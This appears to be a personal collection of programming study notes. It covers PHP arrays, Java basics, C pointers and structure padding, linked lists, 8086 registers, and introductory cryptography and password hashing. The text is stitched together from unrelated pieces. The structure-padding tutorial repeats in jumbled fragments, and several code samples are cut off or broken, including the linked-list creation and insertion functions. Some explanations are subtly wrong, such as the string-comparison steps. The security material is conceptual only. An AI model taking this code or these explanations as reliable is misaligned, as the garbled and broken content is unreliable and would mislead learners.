echo $cars\[2\]\[0\].": In stock: ".$cars\[2\]\[1\].", sold: ".$cars\[2\]\[2\].".&lt;br&gt;";  
echo $cars\[3\]\[0\].": In stock: ".$cars\[3\]\[1\].", sold: ".$cars\[3\]\[2\].".&lt;br&gt;";  
?&gt;   
  
&lt;&lt;------------------------===-----------------------===---------------------------===-----------------------------&gt;&gt;  
We can also put a for loop inside another for loop to get the elements of the $cars array (we still have to point to the two indices):  
Example  
&lt;?php  
for ($row = 0; $row &lt; 4; $row++)  
 {  
  echo "&lt;p&gt;&lt;b&gt;Row number $row&lt;/b&gt;&lt;/p&gt;";  
   echo "&lt;ul&gt;";  
   for ($col = 0; $col &lt; 3; $col++)   
   {  
     echo "&lt;li&gt;".$cars\[$row\]\[$col\]."&lt;/li&gt;";  
   }  
   echo "&lt;/ul&gt;";  
}  
?&gt;

## Hello Java

  
==========  
• Every java program must have at least one class  
• This is our next line in the program, lets break it down to understand
it:  
  
`public`: This makes the main method public that means that we can call
the method from outside the class.  
  
`static`: We do not need to create object for static methods to run.
They can run itself.  
  
`void`: It does not return anything.  
  
`main`: It is the method name. This is the entry point method from which
the JVM can run your program.  
  
`(String[] args)`: Used for command line arguments that are passed as
strings

## Types of Variables in Java

  
There are **three types of variables** in Java.  
1) Local variable 2) Static (or class) variable 3) Instance variable  
  
  
• Declaratioin same as C/C++  
• Type Casting  
{  
char ch = 'P';  
int asciiCode = ch;  
// type casting char as int  
int asciiValue = (int)ch;  
}  
  
**

# Operators

  
=============  
• Same as C/C++  
• [![](../_resources/293-1.png)]()  
•  
  
  
**

# Conditions statements

  
===========================  
• if else === Same as C/C++  
• basic switch case === Same as C/C++  
x Advance Switch Case  
  
  
**

# OOP Concepts

  
=================  
• Creating classes  
{  
modifier class ClassName  
{  
class Variable;  
class method(){}  
}  
}  
  
• Creating Instance  
{  
ClassName object = new ClassName();  
}  
  
• Dynamic Parameter allocation  
static void count(int ... args)  
{  
int result = 0;  
for(int i:args)  
{  
result += i;  
}  
System.out.printf("%d\n",result);  
}  
  
• Array of Objects  
{  
Class\[\] object = new Class\[size\];  
}  
  
• Passing a class as a parameter in methods  
{  
class Human  
{  
String name;  
Human(String name)  
{  
this.name = name;  
}  
  
public String toString()  
{  
return this.name;  
}  
  
}  
  
class DoSomething  
{  
String human;  
DoSomething(Human human)  
{  
this.human = human.name;  
}  
  
void doing(String someThing)  
{  
System.out.printf("%s is %sing\n",this.human,someThing);  
}  
}  
  
Human man = new Human("Jeff");  
DoSomething done = new DoSomething(man);  
done.doing("Work");  
}

# Useful Concepts

  
String Comparison  
==================  
compareTo()  
**How to compare two strings without using library function?**  
1. Input two strings string 1 and string 2.  
2. for (int i = 0; i &lt; str1.length() &&  
i &lt; str2.length(); i ++)  
(Loop through each character of both  
strings comparing them until one  
of the string terminates):  
a. If unicode value of both the characters  
is same then continue;  
b. If unicode value of character of  
string 1 and unicode value of string 2  
is different then return (str1\[i\]-str2\[i\])  
3. if length of string 1 is less than string2  
return str2\[str1.length()\]  
else  
return str1\[str2.length()\]  

# Wrapper Classes

  
• A wrapper class is a class whose object wraps or contains primitive
data types

# Getting started

  
Java  
Created in 1995 in sun microsystem later aquired by oracle. It was
developed by James Gosling and Patrick Naughton  
  
***Java Virtual Machine (JVM)***  
This is generally referred as JVM. Before, we discuss about JVM lets see
the phases of program execution. Phases are as follows: we write the
program, then we compile the program and at last we run the program.  
1) Writing of the program is of course done by java programmer like you
and me.  
2) Compilation of program is done by javac compiler, javac is the
primary java compiler included in java development kit (JDK). It takes
java program as input and generates java bytecode as output.  
3) In third phase, JVM executes the bytecode generated by compiler. This
is called program run phase.  
  
**bytecode**  
As discussed above, javac compiler of JDK compiles the java source code
into bytecode so that it can be executed by JVM. The bytecode is saved
in a .class file by compiler.  
  
**Java Development Kit(JDK)**  
While explaining JVM and bytecode, I have used the term JDK. Letâ€™s
discuss about it. As the name suggests this is complete java development
kit that includes JRE (Java Runtime Environment), compilers and various
tools like JavaDoc, Java debugger etc.  
In order to create, compile and run Java program you would need JDK
installed on your computer.  
  
  
Used for  
\* Mobile application  
\* Desktop application  
\* Web Application  
\* Web Servers  
etc

# Pointer

  

/\*   
The computer’s memory is a sequential collection of storage cells  
  
Whenever we declare a variable, the system allocates, somewhere in the memory, an appropriate  
location to hold the value of the variable  
  
Since, every byte has a unique address number, this location  
will have its own address number. Consider the following statement  
int quantity = 179;  
Variable  
Quantity  
  
This statement instructs the system to fi nd a location for  
the integer variable quantity and puts the value 179 in that  
location. Let us assume that the system has chosen the  
address location 5000 for quantity. We may represent this  
5000 Address as shown in Fig. 11.2. (Note that the address of a variable is the address of the fi rst bye occupied by that variable.)  
  
Pointers are built on the three underlying concepts as illustrated below:  
  
Pointer constants + pointer value + pointer variable  
|\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_|  
pointers  
  
Memory addresses within a computer are referred to as pointer constants  
  
We cannot save the value of a memory address directly. We can only obtain the value through the  
variable stored there using the address operator (&). The value thus obtained is known as pointer value.  
  
The process of assigning the address of a variable to a pointer variable is known as initialization. As  
pointed out earlier, all uninitialized pointers will have some unknown values that will be interpreted as  
memory addresses.  
  
  
In C, the assignment of pointers and addresses is always done symbolically, by means of symbolic  
names. You cannot access the value stored at the address 5368 by writing \*5368. It will not work.  
Program 11.2 illustrates the distinction between pointer value and the value it points to.  
  
A variable that is a pointer to a pointer must be declared using additional indirection operator symbols  
in front of the name  
int \*\*p2;  
  
Like other variables, pointer variables can be used in expressions. For example,  
if p1 and p2 are properly declared and initialized pointers, then the following  
statements are valid:  
y = \*p1 \* \*p2;  
same as (\*p1) \* (\*p2)  
sum = sum + \*p1;  
z = 5\* – \*p2/ \*p1;

\*p2 = \*p2 + 10;  
Note that there is a blank space between / and \* in the item3 above. The following is wrong:

The symbol /\* is considered as the beginning of a comment and therefore the statement fails.  
C allows us to add integers to or subtract integers from pointers, as well as to subtract one pointer  
from another. p1 + 4, p2–2, and p1 – p2 are all allowed. If p1 and p2 are both pointers to the same array,  
then p2 – p1 gives the number of elements between p1 and p2.  
We may also use short-hand operators with the pointers.  
p1++;  
—p2;

any comparison of pointers that refer to separate and unrelated variables makes no sense. Comparisons  
can be used meaningfully in handling arrays and strings.  
We may not use pointers in division or multiplication. For example, expressions such as  
p1 / p2 or p1 \* p2 or p1 / 3  
are not allowed. Similarly, two pointers cannot be added. That is, p1 + p2 is illegal.

# Object type/Data type

  

An object is storage in which you can represent values.  
To be precise, an  
object is defined by the C Standard (ISO/IEC 9899:2018) as a “region ofdata storage in the execution environment, the contents of which can repre-  
sent values,” with the added note, “when referenced, an object can be inter-  
preted as having a particular type.” A variable is an example of an object.

# Notes

  
• C defines two possible execution environments: freestanding and
hosted.  
◇ Freestanding: A freestanding environment may not provide  
an operating system and is typically used in embedded programming.  
◇ Hosted: Provides operating system and executes on user mode or kernel
mode

# typedef

  

# typedef in C

  
The **typedef** is a keyword used in C programming to provide some
meaningful names to the already existing variable in the [C
program](https://www.javatpoint.com/c-programs). It behaves similarly as
we define the alias for the commands. In short, we can say that this
keyword is used to redefine the name of an already existing variable.  
  
  
  

### Using typedef with pointers

  
We can also provide another name or alias name to the pointer variables
with the help of **the typedef**.  
For example, we normally declare a pointer, as shown below:  
  
  
1. int\* ptr;    
  
  
typedef int\* ptr;   
  

# Structure

  
  

## What is Structure

  
Structure in c is a user-defined data type that enables us to store the
collection of different data types. Each element of a structure is
called a member. Structures ca; simulate the use of classes and
templates as it can store various information  
The **,struct** keyword is used to define the structure. Let's see the
syntax to define the structure in c.  
  
  
1. struct structure\_name     
2. {    
3.     data\_type member1;    
4.     data\_type member2;    
5.     .    
6.     .    
7.     data\_type memeberN;    
8. };    
  
  
  

## Accessing members of the structure

  
There are two ways to access structure members:  
1. By . (member or dot operator)  
2. By -&gt; (structure pointer operator)  

# padding

  
<https://www.javatpoint.com/structure-padding-in-c>  
  

# Structure Padding in C

  
Structure padding is a concept in C that adds the one or more empty
bytes between the memory addresses to align the data in memory.  
**Let's first understand the structure padding in**
[C](https://www.javatpoint.com/c-programming-language-tutorial)
**through a simple scenario which is given below:**  
Suppose we create a user-defined structure. When we create an object of
this structure, then the contiguous memory will be allocated to the
structure members.  
  
  
1. struct student    
2. {    
3.    char a;    
4.    char b;    
5.    int c;    
6. } stud1;    
  
  
In the above example, we have created a structure of type **student**.
We have declared the object of this structure named as '**stud1**'.
After the creation of an object, a contiguous block of memory is
allocated to its structure members. First, the memory will be allocated
to the '**a**' variable, then '**b**' variable, and then **'c**'
variable.  
  

### What is the size of the struct student?

  
Now, we calculate the size of the **struct student**. We assume that the
size of the int is 4 bytes, and the size of the char is 1 byte.  
  
  
1. struct student    
2. {    
3.   char a; // 1 byte    
4.   char b; // 1 byte    
5.   int c; // 4 bytes     
6. }    
  
  
In the above case, when we calculate the size of the **struct student**,
size comes to be 6 bytes. But this answer is wrong. Now, we will
understand why this answer is wrong? We need to understand the concept
of structure padding.  
  

### Structure Padding

  
The processor does not read 1 byte at a time. It reads 1 word at a
time.  
**What does the 1 word mean?**  
If we have a 32-bit processor, then the processor reads 4 bytes at a
time, which means that 1 word is equal to 4 bytes.  
  
  
1. 1 word = 4 bytes    
  
  
If we have a 64-bit processor, then the processor reads 8 bytes at a
time, which means that 1 word is equal to 8 bytes.  
  
  
1. 1 word = 8 bytes    
  
  
Therefore, we can say that a 32-bit processor is capable of accessing 4
bytes at a time, whereas a 64-bit processor is capable of accessing 8
bytes at a time. It depends upon the architecture that what would be the
size of the word.  
  

### Why structure padding?

  
  
  
1. struct student    
2. {    
3.   char a; // 1 byte    
4.   char b; // 1 byte    
5.   int c; // 4 bytes     
6. }    
  
  
If we have a 32-bit processor (4 bytes at a time), then the pictorial
representation of the memory for the above structure would be:  
[![](../_resources/258-1.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c1.png)  
As we know that structure occupies the contiguous block of memory as
shown in the above diagram, i.e., 1 byte for char a, 1 byte for char b,
and 4 bytes for int c, then what problem do we face in this case.  
  

### What's the problem?

  
The 4-bytes can be accessed at a time as we are considering the 32-bit
architecture. The problem is that in one CPU cycle, one byte of **char
a**, one byte of **char b**, and 2 bytes of **int c** can be accessed.
We will not face any problem while accessing the **char a** and **char
b** as both the variables can be accessed in one
[CPU](https://www.javatpoint.com/cpu-full-form) cycle, but we will face
the problem when we access the **int c** variable as 2 CPU cycles are
required to access the value of the 'c' variable. In the first CPU
cycle, the first two bytes are accessed, and in the second cycle, the
other two bytes are accessed.  
Suppose we do not want to access the 'a' and 'b' variable, we only want
to access the variable 'c', which requires two cycles. The variable 'c'
is of 4 bytes, so it can be accessed in one cycle also, but in this
scenario, it is utilizing 2 cycles. This is an unnecessary wastage of
CPU cycles. Due to this reason, the structure padding concept was
introduced to save the number of CPU cycles. The structure padding is
done automatically by the compiler. Now, we will see how structure
padding is done.  
  

### How is structure padding done?

  
[![](../_resources/258-2.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c2.png)  
  
In order to achieve the structure padding, an empty row is created on
the left, as shown in the above diagram, and the two bytes which are
occupied by the 'c' variable on the left are shifted to the right. So,
all the four bytes of 'c' variable are on the right. Now, the 'c'
variable can be accessed in a single CPU cycle. After structure padding,
the total memory occupied by the structure is 8 bytes (1 byte+1 byte+2
bytes+4 bytes), which is greater than the previous one. Although the
memory is wasted in this case, the variable can be accessed within a
single cycle.  
**Let's create a simple program of structures.**  
  
  
1. \#include &lt;stdio.h&gt;    
2. struct student    
3. {    
4.    char a;    
5.    char b;    
6.    int c;    
7. };    
8. int main()    
9. {    
10.
   struct student stud1; // variable declaration of the student type..    
11.    // Displaying the size of the structure student.    
12.
   printf("The size of the student structure is %d", sizeof(stud1));    
13.    return 0;    
14. }    
  
  
In the above code, we have created a structure named '**student**'.
Inside the **main()** method, we declare a variable of student type,
i.e., **stud1**, and then we calculate the size of the student by using
the **sizeof()** operator. The output would be **8 bytes** due to the
concept of structure padding, which we have already discussed in the
above.  
**Output**  
[![](../_resources/258-3.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c3.png)  

### Changing order of the variables

  
Now, we will see what happens when we change the order of the variables,
does it affect the output of the program. Let's consider the same
program.  
  
  
1. \#include &lt;stdio.h&gt;    
2. struct student    
3. {    
4.    char a;    
5.    int b;    
6.   char c;    
7. };    
8. int main()    
9. {    
10.
   struct student stud1; // variable declaration of the student type..    
11.    // Displaying the size of the structure student.    
12.
   printf("The size of the student structure is %d", sizeof(stud1));    
13.    return 0;    
14. }    
  
  
The above code is similar to the previous code; the only thing we change
is the order of the variables inside the **structure student**. Due to
the change in the order, the output would be different in both the
cases. In the previous case, the output was 8 bytes, but in this case,
the output is 12 bytes, as we can observe in the below screenshot.  
**Output**  
[![](../_resources/258-4.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c4.png)Now,
we need to understand "**why the output is different in this case**".  
• First, memory is allocated to the **char a** variable, i.e., 1 byte.  
[![](../_resources/258-5.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c5.png)  
• Now, the memory will be allocated to the **int b** Since the **int**
variable occupies 4 bytes, but on the left, only 3 bytes are available.
The empty row will be created on these 3 bytes, and the int variable
would occupy the other 4 bytes so that the integer variable can be
accessed in a single CPU cycle.  
[![](../_resources/258-6.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c6.png)  
• Now, the memory will be given to the **char c** At a time, CPU can
access 1 word, which is equal to 4 bytes, so CPU will use 4 bytes to
access a 'c' variable. Therefore, the total memory required is 12 bytes
(4 bytes +4 bytes +4 bytes), i.e., 4 bytes required to access **char a**
variable, 4 bytes required to access **int b** variable, and other 4
bytes required to access a single character of '**c**' variable.  
[![](../_resources/258-7.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c7.png)  
  
  

### How to avoid the structure padding in C?

  
The structural padding is an in-built process that is automatically done
by the compiler. Sometimes it required to avoid the structure padding in
C as it makes the size of the structure greater than the size of the
structure members.  
We can avoid the structure padding in C in two ways:  
◇ **Using \#pragma pack(1) directive**  
◇ **Using attribute**  
  
**Using \#pragma pack(1) directive**  
  
  
1. \#include &lt;stdio.h&gt;    
2. \#pragma pack(1)    
3. struct base    
4. {    
5.     int a;    
6.     char b;    
7.     double c;    
8. };    
9. int main()    
10. {    
11.   struct base var; // variable declaration of type base    
12.   // Displaying the size of the structure base    
13.   printf("The size of the var is : %d", sizeof(var));    
14. return 0;    
15. }    
  
  
In the above code, we have used the **\#pragma pack(1)** directive to
avoid the structure padding. If we do not use this directive, then the
output of the above program would be 16 bytes. But the actual size of
the structure members is 13 bytes, so 3 bytes are wasted. To avoid the
wastage of memory, we use the **\#pragma pack(1)** directive to provide
the 1-byte packaging.  
**Output**  
[![](../_resources/258-8.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c8.png)◇
**By using attribute**  
  
  
  
1. \#include &lt;stdio.h&gt;    
2.     
3. struct base    
4. {    
5.     int a;    
6.     char b;    
7.     double c;    
8. }\_\_attribute\_\_((packed));  ;    
9. int main()    
10. {    
11.   struct base var; // variable declaration of type base    
12.   // Displaying the size of the structure base    
13.   printf("The size of the var is : %d", sizeof(var));    
14.     
15.     return 0;    
16. }    
  
  
**Output**

6. } stud1;    
  
  
In the above example, we have created a structure of type **student**.
We have declared the object of this structure named as '**stud1**'.
After the creation of an object, a contiguous block of memory is

Now, we calculate the size of the **struct student**. We assume that the

1. struct student    
2. {    
3.   char a; // 1 byte    
4.   char b; // 1 byte    
5.   int c; // 4 bytes     
6. }    
  
  
In the above case, when we calculate the size of the **struct student**,
size comes to be 6 bytes. But this answer is wrong. Now, we will

The processor does not read 1 byte at a time. It reads 1 word at a

**What does the 1 word mean?**  
If we have a 32-bit processor, then the processor reads 4 bytes at a

1. 1 word = 8 bytes

4.   char b; // 1 byte    
5.   int c; // 4 bytes     
6. }    
  
  
If we have a 32-bit processor (4 bytes at a time), then the pictorial
representation of the memory for the above structure would be:  
[![](../_resources/258-9.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c1.png)As
we know that structure occupies the contiguous block of memory as shown
in the above diagram, i.e., 1 byte for char a, 1 byte for char b, and 4
bytes for int c, then what problem do we face in this case.

The 4-bytes can be accessed at a time as we are considering the 32-bit

In the above code, we have created a structure named '**student**'.

### Changing order of the variables

  
Now, we will see what happens when we change the order of the variables,
does it affect the output of the program. Let's consider the same
program.  
  
  
1. \#include &lt;stdio.h&gt;

4.    char a;    
5.    int b;

   printf("The size of the student structure is %d", sizeof(stud1));    
13.    return 0;    
14. }    
  
  
The above code is similar to the previous code; the only thing we change
is the order of the variables inside the **structure student**. Due to
the change in the order, the output would be different in both the
cases. In the previous case, the output was 8 bytes, but in this case,
the output is 12 bytes, as we can observe in the below screenshot.  
**Output**  
[![](../_resources/258-12.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c4.png)Now,
we need to understand "**why the output is different in this case**".  
• First, memory is allocated to the **char a** variable, i.e., 1 byte.  
[![](../_resources/258-13.png)](https://static.javatpoint.com/cpages/images/structure-padding-in-c5.png)  
• Now, the memory will be allocated to the **int b** Since the **int**
variable occupies 4 bytes, but on the left, only 3 bytes are available.
The empty row will be created on these 3 bytes, and the int variable
would occupy the other 4 bytes so that the integer variable can be
accessed in a single CPU cycle.

• Now, the memory will be given to the **char c** At a time, CPU can
access 1 word, which is equal to 4 bytes, so CPU will use 4 bytes to
access a 'c' variable. Therefore, the total memory required is 12 bytes
(4 bytes +4 bytes +4 bytes), i.e., 4 bytes required to access **char a**
variable, 4 bytes required to access **int b** variable, and other 4

### How to avoid the structure padding in C?

  
The structural padding is an in-built process that is automatically done
by the compiler. Sometimes it required to avoid the structure padding in
C as it makes the size of the structure greater than the size of the
structure members.  
We can avoid the structure padding in C in two ways:  
◇ **Using \#pragma pack(1) directive**  
◇ **Using attribute**  
  
**Using \#pragma pack(1) directive**  
  
  
1. \#include &lt;stdio.h&gt;    
2. \#pragma pack(1)    
3. struct base    
4. {    
5.     int a;    
6.     char b;    
7.     double c;    
8. };    
9. int main()    
10. {    
11.   struct base var; // variable declaration of type base    
12.   // Displaying the size of the structure base    
13.   printf("The size of the var is : %d", sizeof(var));    
14. return 0;    
15. }    
  
  
In the above code, we have used the **\#pragma pack(1)** directive to
avoid the structure padding. If we do not use this directive, then the
output of the above program would be 16 bytes. But the actual size of
the structure members is 13 bytes, so 3 bytes are wasted. To avoid the
wastage of memory, we use the **\#pragma pack(1)** directive to provide
the 1-byte packaging.  
**Output**

introduction  
------------------  
Most often we face situations in programming where the data is dynamic in nature. That is, the number  
of data items keep changing during execution of the program. For example, consider a program for  
processing the list of customers of a corporation. The list grows when names are added and shrinks when  
names are deleted. When list grows we need to allocate more memory space to the list to accommodate  
additional data items. Such situations can be handled more easily and effectively by using what is  
known as dynamic data structures in conjunction with dynamic memory management techniques.  
Dynamic data structures provide fl exibility in adding, deleting or rearranging data items at run time.  
Dynamic memory management techniques permit us to allocate additional memory space or to release  
unwanted space at run time, thus, optimizing the use of storage space. This chapter discusses the  
concept of linked lists, , one of the basic types of dynamic data structures. Before we take up linked lists,  
we shall briefly introduce the dynamic storage management functions that are available in C. These  
functions would be extensively used in processing linked lists.  
  
The process of allocating memory at run time is known as dynamic memory allocation.  
there are four library routines known as “memory  
management functions” that can be used for allocating and freeing memory during program execution.  
They are listed in Table 13.1. These functions help us build complex application programs that use the  
available memory intelligently.  
Table 13.1 Memory Allocation Functions  
Function = Task  
malloc = Allocates request size of bytes and returns a pointer to the fi rst byte of the allocated  
space.  
calloc = Allocates space for an array of elements, initializes them to zero and then returns a pointer  
to the memory.  
free = Frees previously allocated space.  
realloc = Modifi es the size of previously allocated space.  
  
The program instructions and global and static variables are stored in a region known as permanent  
storage area and the local variables are stored in another area called stack. The memory space that  
is located between these two regions is available for  
dynamic allocation during execution of the program.  
This free memory region is called the heap. The  
size of the heap keeps changing when program is  
Free memory  
Heap  
executed due to creation and death of variables  
that are local to functions and blocks. Therefore, it  
is possible to encounter memory “overfl ow” during  
dynamic allocation process. In such situations, the  
memory allocation functions mentioned above return  
a NULL pointer (when they fail to locate enough  
memory requested).

# Linked lists

  
What is Linked Lists ?  
*<span style="text-decoration:underline;">Answer:</span>*  
  
**A linked list is a collection of elements but the elements are not
stored in consecutive locations**  
  
***A linked list can also be defined as the collection of the nodes in
which one node is connected to another node, and node consists of two
parts, i.e., one is the data part and the second one is the address
part***  
  
  

# Algorithm for Search operation:

  
  
**Step 1: Set PTR = START  
  
Step 2: Repeat Step 3 while PTR != NULL  
  
Step 3: IF SEARCH\_VAL = PTR -&gt; INFO  
Set POS = PTR  
Print Successful Search!!  
Go to Step 5  
\[End of If\]  
ELSE  
Set PTR = PTR -&gt; NEXT  
\[End of Loop\]  
  
Step 4: Print Unsuccessful Search!!  
  
Step 5: Exit**  
  
  
**

## Function to create a linked list

  
node \*createList(int n)  
{  
node \*head,\*tmp;  
tmp = (node \*) malloc(sizeof(node));  
//========================  
int i = 0;  
printf("Node 1: ");  
scanf("%d",&tmp-&gt;data);  
tmp-&gt;next = NULL;  
//========================  
head = tmp;  
//========================  
for(i = 1;i &lt; n;i++)  
{  
node \*ptr = (node \*) malloc (sizeof(node));  
printf("Node %d: ",i+1);  
scanf("%d",&ptr-&gt;data);  
ptr-&gt;next = NULL;  
tmp-&gt;next = ptr;  
tmp = tmp-&gt;next;  
}  
return head;  
}  

###

### Extended Version:

  
node \*createList(int n)  
{  
node \*head,\*ptr,\*tmp;  
tmp = (node \*) malloc (sizeof(node));  
if (n == 1)  
{  
ptr = (node \*) malloc (sizeof(node));  
printf("Node 1: ");  
scanf("%d",&ptr-&gt;data);  
ptr-&gt;next = NULL;  
tmp = ptr;

ptr-&gt;next = NULL;  
tmp-&gt;next = ptr;  
tmp = tmp-&gt;next;  
}  
}  
return head;  
}  
  
**

## Insert a Node at Nth Position

  
***Steps***  
1. If Head is null and position is not 0. Then exit it.  
2. If Head is null and position is 0. Then insert new Node to the Head
and exit it.  
3. If Head is not null and position is 0. Then the Head reference set to
the new Node. Finally, new Node set to the Head and exit it.  
4. If not, iterate until finding the Nth position or end.  
  
**

## insertion in Nth

  
void Nthnode(int position,int value, node \*\*front)  
{  
int index = 0;  
node \*new = (node \*) malloc(sizeof(node));  
new-&gt;data = value;  
node \*ptr = \*front;  
while((ptr != NULL) && (index != (position - 1)))  
{  
ptr = ptr-&gt;next;  
index++;  
}  
new-&gt;next = ptr-&gt;next;

# Registers

  
• 8 general purpose registers  
▪ AX \[ah,al\]:  
accumulator Registor is mainly used for arithmetic, logic and date
transfer. I/o operation requires the use of al  
and ax. In multiplication and division, one of the numbers involves must
be ax or al.  
  
▪ BX \[bh,bl\]:  
Base register serves as address registor.

Counter register is used to construct loops which works as counter. Also
used for string operation. CL is used to count instructions that shift
and rotates bits.

# Data Types

  
\# Bytes  
• String of 8 bits is called a byte.

# Computer System 101

  
•

### the memory circuits are usually organized Into groups that can store eight bits of data,

  

### and a string of eight bits is called a

“Byte”.  
• Each memory byte is identified by a number called address.  
• The first memory byte has the address of 0.  
• The number of bits on an address depends on the processor.  
• The number of bits in the address determines the number of bytes can
be accessed in the processor.  
• 8086 assigns 20 bits address, the 2^20 potential addresses.  
• I

### n a typical microcomputer, two bytes form a word.

  
  
\# Bit Positions  
• The positions are numbered from right to left, starting from 0.  
• In a memory word, 0 to 7 from the low byte and 8 to 15 is from the
higher byte.  
• For the memory word, its low byte comes from the lower address and the
higher byte comes from the higher address.  
  
  
\# Memory Operations  
[![](../_resources/417-1.png)]()  
• [![](../_resources/417-2.png)]()  
• Can perform read(fetch) and write (store)  
• read operation gets a copy of the data and write operation stores the
data at a different location thus the original data is lost.  
  
\# Buses  
• A processor communicates with the memory and I/O circuits by using
signals that travels along a set of wires or connections called buses.  
• There are three types of buses:  
▪ Address: accesses a specific memory location.  
▪ Data: fetches data from a specific address.  
▪ Control: used to send signal on memory to perform opperations.  
• Each instructions a cpu executes is a bit string.  
• Execution diagram:  
▪ [![](../_resources/417-3.png)]()  
• Instructions performed by cpu are known as instruction set.  
  
\# Execution Unit (EU)  
• Contains ALU  
• Performs arithmetic & logical operation (AND,OR,NOT)  
• EU has 8 registers.  
• Also contains temporary register and flag registers  
  
\# Bus Interface Unit (BIU)  
• handles communication between EU and memory.  
• responsible for transmitting address, data and control signal to the
buses.  
• EU & BIU is connected with an internal bus.  
• while eu executing, biu fetches up to 6 bytes of next instruction &
places them in instruction queue. This operation is called instruction
prefetch.  
  
\# CPU Timing  
• To ensure that cpu is excuting the instruction in orderly fashion, a
clock circuit controls the processor by generating a train of clock
pulse  
• The time interval of two clock pulses are called clock period.  
• The number of pulses per second is called the clock rate/clock
speed.  
• One megahertz is 1 million cycles/pulses per second.  
• Computer circuits are activated by clock pulses.  
  
\# Segmentation & offset  
• a process is divided into segments.  
• a program is divided into few chunks which are not necessarily all of
the same sizes are called segments.

# Instructions

  
• push:

# syscall/Interrupt

  
• An interrupt signals the processor to suspend its current activity
(i.e. running your program) and to pass control to an interrupt service
program (i.e. part of the operating system).  
  
• A software interrupt is one generated by a program (as opposed to  
one generated by hardware)  
  
• In 8086, INT generates the software interrupt.  
  
• This subprogram handles a variety of I/O operations by calling
appropriate subprograms. This means that you must also specify which I/O
operation (e.g. read a character, display a character) you wish to carry
out. This is done by placing a specific number in a register. The \*ah\*
register is used to pass this information

Important Math functionality  
%  
  
There are mainly two types of cryptography  
Symmetric &lt;===========&gt; Asymmetric

### Symmetric : Uses same keys for encryption and decryption → DES,AES → uses smaller bits of keys 128 and 256  Asymmetric : Uses different key for encryption and decryption

  
  
  
  

# Things to look at

  
• Salting  
▪ In cryptography, a salt is **random data that is used as an additional
input to a one-way function that hashes data**, a password or
passphrase. Salts are used to safeguard passwords in storage. ...
Salting is one such protection. A new salt is randomly generated for
each password.

### Math side

  
===============  

# Notes

  
**Plaintext** - Data before encryption or hashing, often text but not
always as it could be a photograph or other file instead.  
**Encoding** - This is NOT a form of encryption, just a form of data
representation like base64 or hexadecimal. Immediately reversible.  
**Hash** - A hash is the output of a hash function. Hashing can also be
used as a verb, "to hash", meaning to produce the hash value of some
data.  
**Brute force** - Attacking cryptography by trying every different
password or every different key  
**Cryptanalysis** - Attacking cryptography by finding a weakness in the
underlying maths  

# Important Note:

  
Quantum computers will soon be a problem for many types of encryption.  
  

### Asymmetric and Quantum

  
While it’s unlikely we’ll have sufficiently powerful quantum computers
until around 2030, once these exist encryption that uses RSA or
Elliptical Curve Cryptography will be very fast to break. This is
because quantum computers can very efficiently solve the mathematical
problems that these algorithms rely on for their strength.  
  

### AES/DES and Quantum

  
AES with 128 bit keys is also likely to be broken by quantum computers
in the near future, but 256 bit AES can’t be broken as easily. Triple
DES is also vulnerable to attacks from quantum computers.  
  

### Current Recommendations

  
The NSA recommends using RSA-3072 or better for asymmetric encryption
and AES-256 or better for symmetric encryption. There are several
competitions currently running for quantum safe cryptographic
algorithms, and it’s likely that we will have a new encryption standard
before quantum computers become a threat to RSA and AE  

# Hashing

  

## What's a hash function?

  
Hash functions are quite different from encryption. There is no key, and
it’s meant to be impossible (or very very difficult) to go from the
output back to the input.  
A hash function takes some input data of any size, and creates a summary
or "digest" of that data. The output is a fixed size. It’s hard to
predict what the output will be for any input and vice versa. Good
hashing algorithms will be (relatively) fast to compute, and slow to
reverse (Go from output and determine input). Any small change in the
input data (even a single bit) should cause a large change in the
output.  
The output of a hash function is normally raw bytes, which are then
encoded. Common encodings for this are base 64 or hexadecimal. Decoding
these won’t give you anything useful  
  
  

## What's a hash collision?

  
A hash collision is when 2 different inputs give the same output. Hash
functions are designed to avoid this as best as they can, especially
being able to engineer (create intentionally) a collision. Due to the
pigeonhole effect, collisions are not avoidable. The pigeonhole effect
is basically, there are a set number of different output values for the
hash function, but you can give it any size input. As there are more
inputs than outputs, some of the inputs must give the same output. If
you have 128 pigeons and 96 pigeonholes, some of the pigeons are going
to have to share.  
MD5 and SHA1 have been attacked, and made technically insecure due to
engineering hash collisions. However, no attack has yet given a
collision in both algorithms at the same time so if you use the MD5 hash
AND the SHA1 hash to compare, you will see they’re different. The MD5
collision example is available
from <https://www.mscs.dal.ca/~selinger/md5collision/> and details of
the SHA1 Collision are available from <https://shattered.io/>. Due to
these, you shouldn't trust either algorithm for hashing passwords or
data.  
  
  
  

## Hashing for password verification

  
Most webapps need to verify a user's password at some point. Storing
these passwords in plain text would be bad. You've probably seen news
stories about companies that have had their database
leaked. <span class="small">Knowing some people, they use the same
password for everything including their banking, so leaking these would
be really really bad.</span>  
Quite a few data breaches have leaked plaintext passwords. You’re
probably familiar with “rockyou.txt” on Kali as a password wordlist.
This came from a company that made widgets for MySpace. They stored
their passwords in plaintext and the company had a data breach. The txt
file contains over 14 million passwords (although some are \*unlikely\*
to have been user passwords. Sort by length if you want to see what I
mean).  
  
  
Adobe had a notable data breach that was slightly different. The
passwords were encrypted, rather than hashed and the encryption that was
used was not secure. This meant that the plaintext could be relatively
quickly retrieved. If you want to read more about this breach, this post
from Sophos is
excellent: <https://nakedsecurity.sophos.com/2013/11/04/anatomy-of-a-password-disaster-adobes-giant-sized-cryptographic-blunder/>  
  
Linkedin also had a data breach. Linkedin used SHA1 for password
verification, which is quite quick to compute using GPUs.   
You can't encrypt the passwords, as the key has to be stored somewhere.
If someone gets the key, they can just decrypt the passwords.  
This is where hashing comes in. What if, instead of storing the
password, you just stored the hash of the password? This means you never
have to store the user's password, and if your database was leaked then
an attacker would have to crack each password to find out what the
password was. That sounds fairly useful.  
There's just one problem with this. What if two users have the same
password? As a hash function will always turn the same input into the
same output, you will store the same password hash for each user. That
